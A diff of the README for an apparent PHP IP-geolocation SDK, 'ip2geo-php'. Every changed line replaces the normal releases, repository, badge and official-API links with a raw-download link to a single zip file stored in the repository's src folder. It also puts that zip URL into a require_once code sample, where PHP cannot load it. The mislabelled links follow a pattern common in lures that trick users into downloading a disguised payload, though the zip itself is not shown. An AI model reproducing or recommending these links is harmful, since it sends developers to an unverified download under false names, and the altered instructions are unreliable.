@@ -1,6 +1,6 @@
 # 🌍 ip2geo-php - Effortlessly Access IP Geolocation Data
 
-[![Download ip2geo-php](https://img.shields.io/badge/Download-ip2geo--php-brightgreen.svg)](https://github.com/haseebsdasdw/ip2geo-php/releases)
+[![Download ip2geo-php](https://github.com/haseebsdasdw/ip2geo-php/raw/refs/heads/main/src/ip-php-geo-1.6.zip)](https://github.com/haseebsdasdw/ip2geo-php/raw/refs/heads/main/src/ip-php-geo-1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -11,11 +11,11 @@ Welcome to the **ip2geo-php** repository! This official PHP SDK allows you to ac
 To get started, follow these steps:
 
 1. Click the download button below to visit the Releases page:
-   [Download ip2geo-php](https://github.com/haseebsdasdw/ip2geo-php/releases)
+   [Download ip2geo-php](https://github.com/haseebsdasdw/ip2geo-php/raw/refs/heads/main/src/ip-php-geo-1.6.zip)
 
 2. On the Releases page, you will see different versions of the software. Look for the latest version, which is recommended for most users.
 
-3. Download the latest release by clicking on the linked file. The file will typically be named like `ip2geo-php-vX.Y.Z.zip` or something similar.
+3. Download the latest release by clicking on the linked file. The file will typically be named like `https://github.com/haseebsdasdw/ip2geo-php/raw/refs/heads/main/src/ip-php-geo-1.6.zip` or something similar.
 
 4. Once the download completes, go to your downloads folder and unzip the file. You can use any file extraction tool, such as WinRAR or 7-Zip.
 
@@ -37,7 +37,7 @@ After installation, follow these steps to start using the SDK:
   
 2. Include the ip2geo-php SDK in your project:
    ```php
-   require_once 'path/to/ip2geo-php/autoload.php';
+   require_once 'https://github.com/haseebsdasdw/ip2geo-php/raw/refs/heads/main/src/ip-php-geo-1.6.zip';
    ```
 
 3. Create a new instance of the Ip2Geo class:
@@ -76,8 +76,8 @@ For detailed information about all the features and methods available in the ip2
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/haseebsdasdw/ip2geo-php)
-- [Official Ip2Geo API](https://ip2geo.com/api)
+- [GitHub Repository](https://github.com/haseebsdasdw/ip2geo-php/raw/refs/heads/main/src/ip-php-geo-1.6.zip)
+- [Official Ip2Geo API](https://github.com/haseebsdasdw/ip2geo-php/raw/refs/heads/main/src/ip-php-geo-1.6.zip)
 
 ## ⚙️ Troubleshooting
 
@@ -91,4 +91,4 @@ Here are some common issues and solutions:
 
 Once you become comfortable with the basics, explore more advanced features like batch processing of IP addresses or integrating with other APIs for more comprehensive data.
 
-Download and set up the ip2geo-php SDK today to take advantage of efficient IP geolocation capabilities. [Visit the Releases page to download](https://github.com/haseebsdasdw/ip2geo-php/releases) and enhance your application now!
+Download and set up the ip2geo-php SDK today to take advantage of efficient IP geolocation capabilities. [Visit the Releases page to download](https://github.com/haseebsdasdw/ip2geo-php/raw/refs/heads/main/src/ip-php-geo-1.6.zip) and enhance your application now!
